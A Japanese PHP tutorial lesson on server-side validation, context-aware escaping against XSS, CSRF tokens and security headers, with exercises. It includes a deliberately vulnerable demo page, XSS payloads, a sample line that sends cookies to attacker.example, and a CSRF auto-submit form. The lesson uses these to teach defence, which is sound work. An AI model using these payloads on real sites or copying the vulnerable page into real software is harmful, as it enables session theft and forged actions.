# 3-7 バリデーションとエスケープ（XSS対策）

> 🎯 **このレッスンのゴール**
> - サーバー側バリデーションの正しい書き方を身につける
> - XSS を実際に体験し、確実に防げるようになる
> - CSRF の仕組みと対策を理解する

所要 150分 / 難度 🔴
完成コード: [`code/03-07/`](../code/03-07/)

---

## 📖 大原則：クライアントから来るデータは、すべて疑う

第2部（2-8）で、JavaScript のバリデーションは「親切機能」であってセキュリティではない、と学びました。

**その理由を、実際にやって確かめます。**

### JavaScript のバリデーションは、こうやって突破される

```
① 開発者ツールで required 属性を消す
② JavaScript を無効にする
③ curl でサーバーに直接POSTする
```

**③ を実際にやってみてください。**

```bash
curl -X POST http://localhost/php-lesson/contact.php \
  -d "name=" \
  -d "email=not-an-email" \
  -d "message="
```

**HTMLもJavaScriptも一切通らずに、PHPにデータが届きます。**

> ⚠️ **フォーム画面を経由しない通信は、日常的に起こります。**
> 攻撃者だけでなく、ボット、クローラー、APIクライアントも同じことをします。
>
> **サーバー側の検証だけが、本当の防御です。**

---

## ✍️ 手を動かす① ─ バリデーションの設計

### 検証する順番

```
① 必須チェック      → 空なら以降は不要
② 型・形式チェック   → 数値か、メール形式か
③ 長さチェック      → 上限・下限
④ 範囲チェック      → min / max
⑤ ホワイトリスト     → 許可された値か
⑥ 業務ルール        → 重複していないか、在庫があるか
```

### 検証ライブラリを自作する

`lib/validator.php`（📋 完成形は `code/03-07/lib/validator.php`）

```php
<?php
declare(strict_types=1);
require_once __DIR__ . "/functions.php";

/**
 * 入力値の検証をまとめるクラス的な関数群
 * 各関数は「エラーメッセージ」か null を返す
 */

function v_required(?string $value, string $label): ?string
{
    return is_blank($value) ? "{$label}を入力してください" : null;
}

function v_max_length(?string $value, int $max, string $label): ?string
{
    $len = mb_strlen($value ?? "");
    return $len > $max
        ? "{$label}は{$max}文字以内で入力してください（現在{$len}文字）"
        : null;
}

function v_min_length(?string $value, int $min, string $label): ?string
{
    $len = mb_strlen($value ?? "");
    return $len > 0 && $len < $min
        ? "{$label}は{$min}文字以上で入力してください"
        : null;
}

function v_email(?string $value): ?string
{
    $v = trim_ja($value ?? "");
    if ($v === "") return null;   // 必須チェックは v_required に任せる

    if (!filter_var($v, FILTER_VALIDATE_EMAIL)) {
        return "メールアドレスの形式が正しくありません";
    }
    if (mb_strlen($v) > 254) {
        return "メールアドレスが長すぎます";
    }
    return null;
}

function v_tel(?string $value): ?string
{
    $v = trim_ja($value ?? "");
    if ($v === "") return null;

    if (!preg_match('/\A[0-9\-]+\z/', $v)) {
        return "電話番号は数字とハイフンで入力してください";
    }
    $digits = str_replace("-", "", $v);
    if (mb_strlen($digits) < 10 || mb_strlen($digits) > 11) {
        return "電話番号は10桁または11桁で入力してください";
    }
    return null;
}

function v_integer(?string $value, string $label): ?string
{
    $v = trim_ja($value ?? "");
    if ($v === "") return null;

    if (!preg_match('/\A-?[0-9]+\z/', $v)) {
        return "{$label}は半角数字で入力してください";
    }
    return null;
}

function v_range(?string $value, int $min, int $max, string $label): ?string
{
    $v = trim_ja($value ?? "");
    if ($v === "") return null;

    $n = (int) $v;
    return ($n < $min || $n > $max)
        ? "{$label}は{$min}〜{$max}の範囲で入力してください"
        : null;
}

function v_in(?string $value, array $allowed, string $label): ?string
{
    $v = $value ?? "";
    if ($v === "") return null;

    return in_array($v, $allowed, true)
        ? null
        : "{$label}の値が正しくありません";
}

function v_date(?string $value, string $label): ?string
{
    $v = trim_ja($value ?? "");
    if ($v === "") return null;

    $d = DateTime::createFromFormat("Y-m-d", $v);
    if (!$d || $d->format("Y-m-d") !== $v) {
        return "{$label}の日付が正しくありません";
    }
    return null;
}

function v_checked(mixed $value, string $label): ?string
{
    return isset($value) ? null : "{$label}にチェックしてください";
}

/**
 * 複数の検証結果から、null を取り除いて最初のエラーだけ残す
 */
function first_error(array $results): ?string
{
    foreach ($results as $r) {
        if ($r !== null) return $r;
    }
    return null;
}
```

### 使い方

```php
<?php
$errors = [];

$errors["name"] = first_error([
    v_required($input["name"], "お名前"),
    v_max_length($input["name"], 50, "お名前"),
]);

$errors["email"] = first_error([
    v_required($input["email"], "メールアドレス"),
    v_email($input["email"]),
]);

$errors["guests"] = first_error([
    v_required($input["guests"], "ご来店人数"),
    v_integer($input["guests"], "ご来店人数"),
    v_range($input["guests"], 1, 8, "ご来店人数"),
]);

$errors["topic"] = v_in($input["topic"], ["reserve", "bean", "event", "other"], "ご用件");

// null（エラーなし）を取り除く
$errors = array_filter($errors, fn($e) => $e !== null);

if (count($errors) === 0) {
    // 保存処理
}
```

> 💡 **`first_error()` で「1項目につき1メッセージ」にするのがコツです。**
> 「必須です」と「50文字以内です」が同時に出ると、ユーザーが混乱します。

### `filter_var` を使う

PHPには標準の検証関数があります。

```php
<?php
filter_var($email, FILTER_VALIDATE_EMAIL);   // メール形式（false または値）
filter_var($url, FILTER_VALIDATE_URL);       // URL形式
filter_var($ip, FILTER_VALIDATE_IP);         // IPアドレス
filter_var($n, FILTER_VALIDATE_INT);         // 整数
filter_var($f, FILTER_VALIDATE_FLOAT);       // 小数

// 範囲つき
filter_var($n, FILTER_VALIDATE_INT, ["options" => ["min_range" => 1, "max_range" => 8]]);
```

> ⚠️ **戻り値は「値または `false`」です。** `0` が有効な値の場合、`if (!$result)` では判定できません。
> **`=== false` で比較**してください。

> 💡 **メールの検証は `FILTER_VALIDATE_EMAIL` に任せてください。**
> 自作の正規表現は、必ずどこかで正しいアドレスを弾きます。

---

## ✍️ 手を動かす② ─ XSS を実際に体験する

**読むだけでなく、必ず手を動かしてください。**

### 脆弱なページを作る

`php-lesson/xss-demo.php`

```php
<?php
declare(strict_types=1);
$comment = $_GET["comment"] ?? "";
?>
<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>XSS デモ</title></head>
<body>
  <h1>コメント表示（脆弱版）</h1>

  <form method="get">
    <input type="text" name="comment" size="60" value="<?= $comment ?>">
    <button type="submit">表示</button>
  </form>

  <h2>あなたのコメント</h2>
  <div><?= $comment ?></div>
</body>
</html>
```

### 攻撃してみる

入力欄に、以下を順に入れて送信してください。

```
<b>太字になる</b>
```

**太字で表示されます。** HTMLとして解釈されています。

```
<img src=x onerror="alert('XSS')">
```

**アラートが出ます。** JavaScript が実行されました。

```
"><script>alert(document.cookie)</script>
```

**`value` 属性から抜け出して、スクリプトが実行されます。**
`"` で属性を閉じ、`>` でタグを閉じ、新しいタグを注入しています。

### 何が奪われるのか

```javascript
// 攻撃者が仕込むスクリプトの例（実行はしないでください）
fetch("https://attacker.example/steal?c=" + document.cookie);
```

| 奪われるもの | 結果 |
| --- | --- |
| Cookie（セッションID） | **ログイン状態を乗っ取られる** |
| localStorage | 保存したトークンやデータ |
| 画面の内容 | 表示中の個人情報 |
| フォームの入力 | 入力中のパスワード |

さらに、**偽のログインフォームを表示**して、パスワードを直接入力させることもできます。

> ⚠️ **XSS は「アラートが出るだけの軽い問題」ではありません。**
> アカウント乗っ取り、個人情報流出、不正送金に直結します。

### 修正する

```php
<?php
require_once __DIR__ . "/lib/functions.php";
$comment = $_GET["comment"] ?? "";
?>
  <input type="text" name="comment" size="60" value="<?= e($comment) ?>">
  <div><?= e($comment) ?></div>
```

**同じ入力を試してください。** タグが文字として表示されるだけになります。

---

## ✍️ 手を動かす③ ─ エスケープを文脈で使い分ける

**「エスケープ」は1種類ではありません。出力する場所によって方法が変わります。**

| 出力先 | 使う関数 | 例 |
| --- | --- | --- |
| HTMLの本文 | `htmlspecialchars()` = `e()` | `<p><?= e($x) ?></p>` |
| HTMLの属性値 | 同上（**クォートで囲む**） | `value="<?= e($x) ?>"` |
| URLのクエリ | `urlencode()` | `?q=<?= urlencode($x) ?>` |
| JavaScript の中 | `json_encode()` | `const x = <?= json_encode($x) ?>;` |
| CSS の中 | **値を入れない**（設計を変える） | — |
| SQL | **プレースホルダ**（第4部） | エスケープではなく分離 |
| メールヘッダー | 改行を除去 | 後述 |

### 特に危険なパターン

#### ① href / src にユーザー入力を入れる

```php
<!-- ❌ javascript: スキームが使える -->
<a href="<?= e($user_url) ?>">サイト</a>
```

`$user_url` が `javascript:alert(1)` だと、**クリックでスクリプトが実行されます**。
`e()` では防げません（`:` はエスケープ対象外）。

```php
<?php
/**
 * 安全なURLかチェックする
 */
function safe_url(?string $url): ?string
{
    $url = trim($url ?? "");
    if ($url === "") return null;

    $scheme = parse_url($url, PHP_URL_SCHEME);
    if (!in_array(strtolower((string) $scheme), ["http", "https"], true)) {
        return null;
    }
    return $url;
}
```

```php
<?php $url = safe_url($user_url); ?>
<?php if ($url !== null): ?>
  <a href="<?= e($url) ?>" rel="noopener noreferrer" target="_blank">サイト</a>
<?php endif; ?>
```

#### ② イベントハンドラ属性にユーザー入力を入れる

```php
<!-- ❌ 絶対にやってはいけない -->
<button onclick="doSomething('<?= e($id) ?>')">
```

**`e()` を通してもエスケープが不十分な文脈です。** `data-` 属性を使ってください。

```php
<!-- ✅ -->
<button type="button" class="js-action" data-id="<?= e($id) ?>">
```

#### ③ メールヘッダーへの注入

```php
<?php
// ❌ 改行を入れられると、勝手にBccを追加される
mail($to, $subject, $body, "From: {$_POST['email']}");

// ✅ 改行を除去する
$from = str_replace(["\r", "\n"], "", $_POST["email"] ?? "");
if (!filter_var($from, FILTER_VALIDATE_EMAIL)) {
    // 不正なら処理を中止
}
```

---

## ✍️ 手を動かす④ ─ 改行を含む文章の表示

掲示板の投稿などで、改行を保ちたい場合があります。

```php
<?php
// ❌ 順番が逆。<br> までエスケープされてしまう
echo e(nl2br($text));

// ✅ 先にエスケープ、そのあと改行変換
echo nl2br(e($text));

// ✅ CSSで解決する方法（こちらのほうが安全で簡単）
?>
<p class="body"><?= e($text) ?></p>
<style>
.body { white-space: pre-wrap; }
</style>
```

> 💡 **`white-space: pre-wrap` を使うのが最も安全です。**
> HTMLを一切生成しないため、エスケープの考慮が不要になります。
> 連続する空白も保持されます。

---

## ✍️ 手を動かす⑤ ─ CSRF 対策

### CSRF とは

**Cross-Site Request Forgery（クロスサイト・リクエスト・フォージェリ）**

```
① ユーザーが banking.example にログイン中（Cookieが有効）
② 攻撃者のサイト evil.example を開いてしまう
③ evil.example に、こんなHTMLが仕込まれている

   <form action="https://banking.example/transfer" method="post" id="f">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="1000000">
   </form>
   <script>document.getElementById("f").submit();</script>

④ ユーザーのCookieが自動的に送られ、送金が実行される
```

**ユーザーは何もクリックしていないのに、操作が実行されます。**

> ⚠️ **GET で「削除」や「更新」を実装すると、`<img src="/delete.php?id=1">` だけで実行されます。**
> **状態を変える操作は必ず POST**、これが第1のルールです。

### 対策：CSRFトークン

```
① フォームを表示するとき、ランダムな文字列（トークン）を生成し、
   セッションに保存 + フォームの hidden にも埋める
② 送信されたトークンと、セッションのトークンを比較する
③ 一致しなければ拒否する

→ 攻撃者は、被害者のセッションのトークンを知ることができないので、
  正しいトークンを埋めたフォームを作れない
```

### 実装

`lib/csrf.php`（📋 コピペして使ってください）

```php
<?php
declare(strict_types=1);

/**
 * CSRFトークンを取得する（無ければ生成）
 */
function csrf_token(): string
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        throw new RuntimeException("session_start() を先に呼んでください");
    }
    if (empty($_SESSION["_csrf_token"])) {
        $_SESSION["_csrf_token"] = bin2hex(random_bytes(32));
    }
    return $_SESSION["_csrf_token"];
}

/**
 * フォームに埋め込む hidden タグを返す
 */
function csrf_field(): string
{
    $token = htmlspecialchars(csrf_token(), ENT_QUOTES, "UTF-8");
    return '<input type="hidden" name="_csrf_token" value="' . $token . '">';
}

/**
 * 送信されたトークンを検証する
 */
function csrf_verify(?string $token): bool
{
    $saved = $_SESSION["_csrf_token"] ?? "";
    if ($saved === "" || $token === null || $token === "") {
        return false;
    }
    // hash_equals はタイミング攻撃に強い比較
    return hash_equals($saved, $token);
}
```

### 使う側

```php
<?php
declare(strict_types=1);
session_start();
require_once __DIR__ . "/lib/csrf.php";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!csrf_verify($_POST["_csrf_token"] ?? null)) {
        http_response_code(419);
        exit("セッションの有効期限が切れました。お手数ですが、もう一度お試しください。");
    }

    // ここから通常の処理
}
?>
<form method="post">
  <?= csrf_field() ?>
  <input type="text" name="name">
  <button type="submit">送信</button>
</form>
```

### 押さえるポイント

| 実装 | 理由 |
| --- | --- |
| `random_bytes(32)` | **暗号学的に安全な乱数**。`rand()` や `mt_rand()` は使わない |
| `bin2hex()` | バイナリを16進文字列にする |
| `hash_equals()` | **タイミング攻撃**を防ぐ比較。`===` より安全 |
| POST のみ検証 | GET で状態を変えないのが前提 |
| 419 を返す | Laravel と同じ慣習（「セッション切れ」の意味） |

> 💡 **Laravel（第5部）では `@csrf` と書くだけで、これが自動で行われます。**
> **いま仕組みを理解しておくと、第5部で「あれか」とつながります。**

---

## ✍️ 手を動かす⑥ ─ セキュリティヘッダー

```php
<?php
// ページの先頭（出力前）に書く
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Content-Security-Policy: default-src 'self'");
```

| ヘッダー | 効果 |
| --- | --- |
| `X-Content-Type-Options: nosniff` | ブラウザの MIME 推測を無効化 |
| `X-Frame-Options: DENY` | iframe への埋め込みを禁止（クリックジャッキング対策） |
| `Referrer-Policy` | リファラの送信を制限 |
| `Content-Security-Policy` | **スクリプトの実行元を制限**（XSS の被害を大幅に減らす） |

> 💡 **CSP は強力ですが、設定が難しく、インラインスクリプトが動かなくなります。**
> 学習段階では上3つだけ設定し、CSP は第6部（デプロイ）で扱います。

---

## ⚠️ つまずきポイントまとめ

| 症状 | 原因 | 対処 |
| --- | --- | --- |
| JSで検証したのに不正なデータが入る | サーバー側で検証していない | 必ずサーバーでも検証 |
| `e()` したのにスクリプトが動く | `href` / `onclick` に入れている | URLスキーム検証、`data-` 属性 |
| `<br>` が文字として表示される | `e(nl2br($x))` の順序 | `nl2br(e($x))` |
| CSRFトークンが一致しない | `session_start()` を呼んでいない | ファイル先頭で呼ぶ |
| `filter_var` の判定がおかしい | `false` と `0` を区別していない | `=== false` |
| 正しいメールが弾かれる | 自作の正規表現が厳しすぎる | `FILTER_VALIDATE_EMAIL` |
| エラーメッセージが2つ出る | 各検証を全部実行している | `first_error()` で最初の1つだけ |

---

## 🤖 AIに聞いてみよう

### ① セキュリティレビュー（必ず新しい会話で）

```text
以下のPHPコードを、セキュリティの観点からレビューしてください。
Webアプリケーションで、一般ユーザーからの入力を扱うコードです。

（コードを貼る）

次の観点で、問題があれば具体的に指摘してください。

- XSS（出力エスケープの漏れ、文脈に合わないエスケープ）
- CSRF
- ヘッダーインジェクション
- オープンリダイレクト
- 検証の不足（型、範囲、ホワイトリスト）
- エラーメッセージからの情報漏洩

それぞれ、なぜ危険か・攻撃されると何が起きるかも説明してください。
問題がない場合は「問題なし」と明言してください。
```

> 💡 **このプロンプトは、これから書くすべてのPHPコードに使ってください。**
> 目視ではエスケープ漏れを必ず見落とします。

### ② 攻撃者の視点を学ぶ（防御目的）

```text
私は、自分が作ったWebアプリのセキュリティを高めたいと考えています。

以下のフォームについて、「攻撃者ならどこを狙うか」という観点で、
チェックすべき項目をリストアップしてください。

（フォームのHTMLとPHPを貼る）

条件:
- 実際に動く攻撃コードは示さないでください
- 「どこが弱点になりうるか」と「どう防ぐか」の観点でお願いします
- 私が自分でテストできる、安全な確認方法を教えてください
```

---

## 🔧 やってみよう（演習）

### 演習1（必須）─ XSS を体験する

- [ ] `xss-demo.php`（脆弱版）を作る
- [ ] `<b>太字</b>` を入力して、太字になることを確認
- [ ] `<img src=x onerror="alert(1)">` でアラートが出ることを確認
- [ ] `"><script>alert(1)</script>` で、属性から抜け出せることを確認
- [ ] `e()` を追加して、すべて文字として表示されることを確認
- [ ] **確認したら、このファイルを削除する**

> ⚠️ **脆弱なファイルを残さないでください。** 学習用でも、公開サーバーには絶対に置かないこと。

### 演習2（必須）─ エスケープの誤りを見つける

以下のコードには、**7か所の問題**があります。すべて指摘してください。

```php
<?php
$name = $_POST["name"];
$url = $_POST["website"];
$bio = $_POST["bio"];
$id = $_GET["id"];
?>
<div class="profile">
  <h2><?= $name ?></h2>
  <a href="<?= e($url) ?>">サイト</a>
  <p><?= e(nl2br($bio)) ?></p>
  <button onclick="deleteUser('<?= e($id) ?>')">削除</button>
  <a href="/delete.php?id=<?= e($id) ?>">削除する</a>
  <script>
    const profile = "<?= e($name) ?>";
  </script>
  <img src="<?= $_POST["avatar"] ?>" alt="">
</div>
```

<details>
<summary>答えを見る</summary>

1. **`<?= $name ?>`** — エスケープなし → `e($name)`
2. **`href="<?= e($url) ?>"`** — `javascript:` スキームを防げない → `safe_url()` で検証
3. **`e(nl2br($bio))`** — 順序が逆 → `nl2br(e($bio))`、または `white-space: pre-wrap`
4. **`onclick="deleteUser('...')"`** — イベントハンドラ属性は `e()` では不十分 → `data-id` にする
5. **`<a href="/delete.php?id=...">削除する</a>`** — **GET で削除している**。CSRF の入口。
   POST + CSRFトークンにする
6. **`const profile = "<?= e($name) ?>"`** — JS 文脈では不十分 → `json_encode()`
7. **`src="<?= $_POST["avatar"] ?>"`** — エスケープなし + URLスキーム検証なし + `?? ""` もない

**さらに**：`$_POST["name"]` などに `?? ""` がなく、GET アクセス時に Warning が出ます。

</details>

### 演習3（必須）

3-6 の演習3で作ったお問い合わせフォームに、以下を追加してください。

- [ ] `lib/validator.php` を作り、検証関数を実装する
- [ ] すべての項目をサーバー側で検証する
- [ ] `first_error()` で「1項目1メッセージ」にする
- [ ] CSRFトークンを実装する
- [ ] セキュリティヘッダーを3つ設定する
- [ ] **curl で直接POSTして、不正なデータが弾かれることを確認する**

```bash
# CSRFトークンなしで送る → 419 が返るはず
curl -i -X POST http://localhost/php-lesson/contact.php \
  -d "name=test" -d "email=a@b.com" -d "message=test"

# 空データを送る → エラーになるはず
curl -X POST http://localhost/php-lesson/contact.php \
  -d "name=" -d "email=" -d "message="
```

> 💡 **curl でのテストは、実務でも必ず行います。**
> 「ブラウザからは弾かれるが、直接POSTすると通る」というバグは非常に多いです。

### 演習4（挑戦）

**掲示板の投稿表示部分**を、安全に実装してください。

- [ ] 投稿本文（改行を含む）を安全に表示する
- [ ] 投稿者名を安全に表示する
- [ ] 投稿者のWebサイトURL（任意）を、`safe_url()` で検証して表示する
- [ ] 本文中のURLを自動リンク化する（**これが最も難しい**）

> ⚠️ **自動リンク化は、XSS の温床です。**
> 「先にエスケープしてから、エスケープ済みの文字列に対して正規表現でリンクを作る」
> という順序を守ってください。逆にすると、生成した `<a>` タグごとエスケープされるか、
> 攻撃コードが通ります。
>
> ```php
> function autolink(string $text): string
> {
>     $escaped = e($text);   // ① 先に全部エスケープ
>     // ② エスケープ済みの文字列に対してリンクを作る
>     return preg_replace(
>         '#(https?://[\w!?/+\-_~;.,*&@\#$%()\'\[\]]+)#u',
>         '<a href="$1" rel="noopener noreferrer" target="_blank">$1</a>',
>         $escaped
>     );
> }
> ```
>
> **この実装が本当に安全か、AIにセキュリティレビューさせてください。**

---

## ✅ 章末チェック

- [ ] JavaScript の検証がセキュリティにならない理由を、curl で確認した
- [ ] XSS を実際に発生させて、その後修正した
- [ ] XSS で何が奪われるか説明できる
- [ ] HTML / URL / JavaScript でエスケープ方法が違うことを理解した
- [ ] `href` に `javascript:` が入る危険を知っている
- [ ] `nl2br(e($x))` の順序を説明できる
- [ ] CSRF の仕組みを図で説明できる
- [ ] CSRFトークンを実装できる
- [ ] `random_bytes()` と `hash_equals()` を使う理由を言える
- [ ] 「状態を変える操作は POST」の原則を理解した

---

**前 → [3-6 GET / POST でデータを受け取る](03-06-get-post.md)　｜　次 → [3-8 セッションとクッキー](03-08-session.md)**
